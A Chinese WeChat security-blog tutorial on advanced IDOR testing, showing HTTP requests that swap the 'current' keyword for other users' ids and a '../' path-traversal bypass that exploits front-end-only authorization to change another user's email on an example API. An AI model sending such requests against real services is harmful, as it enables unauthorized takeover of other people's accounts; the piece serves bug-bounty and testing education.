---
title: IDOR的高阶技巧
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497036&idx=1&sn=6df1868343a2b09dfe1fc12fe326ad1f&chksm=e8a5ff2fdfd27639f0da0b53e1413716350cab6d0164c095c431f8680882ed871d1a9cb1c8af&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2025-02-06
fetch_date: 2025-10-06T20:37:04.202939
---

# IDOR的高阶技巧

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj5cySxiaGOjYw97FKibiawNwtJ7f6OVMsickDpNtcYAia0Hj8NhUAuoAbFKaNmqjG98BUxl88efrTNhVCQ/0?wx_fmt=jpeg)

# IDOR的高阶技巧

richardo1o1

迪哥讲事

IDOR的高阶技巧

## 正文

正常:

```
PUT /api/users/current/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "user@example.com"
}

#响应:
HTTP/2 200 OK
Server: nginx/1.19.0
Date: Fri, 16 Feb 2024 13:37:00 GMT
Content-Type: application/json

{
  "userId": 1234,
  "email": "user@example.com"
}
```

在开发者经常会用current和me这种关键字,可以尝试利用用户id(数字)来替代current

下面是测试步骤:

1th:将current变为当前用户的id

```
PUT /api/users/1234/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "changed@example.com"
}

#响应:
HTTP/2 200 OK
Server: nginx/1.19.0
Date: Fri, 16 Feb 2024 13:37:00 GMT
Content-Type: application/json

{
  "userId": 1234,
  "email": "changed@example.com"
}
```

如果响应正常的话可以替换id

2th:将current改为别人的id

```
PUT /api/users/1235/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "changed@example.com"
}

#响应:
HTTP/2 200 OK
Server: nginx/1.19.0
Date: Fri, 16 Feb 2024 13:37:00 GMT
Content-Type: application/json

{
  "userId": 1235,
  "email": "changed@example.com"
}
```

上面这种情况有时候会越权失败,可以尝试一下绕过,这里就有一种情况是这样的:

厂商至少有2个api服务器,其中一个位于前端，负责处理所有客户端请求...…

还有一个在后端,通常是一个存储数据且只能在内部访问的数据库

开发者经常犯的错误是只验证前端 API 的访问,但是不验证任何用户输入

于是就有了下面的绕过思路:

```
#原请求
PUT /api/users/current/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "user@example.com"
}

#改变之后请求
PUT /api/users/current/../1234/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "user@example.com"
}
```

前端API服务器处理该请求时，会解析允许请求通过的“current”关键字，并将其转发给后端API服务器,当后端 API 收到请求时，它会转换为以下请求：

```
PUT /api/users/1234/profile/email HTTP/2

Host: api-internal-dbs:80
Content-Type: application/json

{
  "email": "user@example.com"
}
```

那这里我们可以进行越权:

```
PUT /api/users/current/../1235/profile/email HTTP/2

Host: api.example.com
Authorization: Bearer eyJ...
Content-Type: application/json

{
  "email": "changed@example.com"
}

#响应
HTTP/2 200 OK
Server: nginx/1.19.0
Date: Fri, 16 Feb 2024 13:37:00 GMT
Content-Type: application/json

{
  "userId": 1235,
  "email": "changed@example.com"
}
```

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过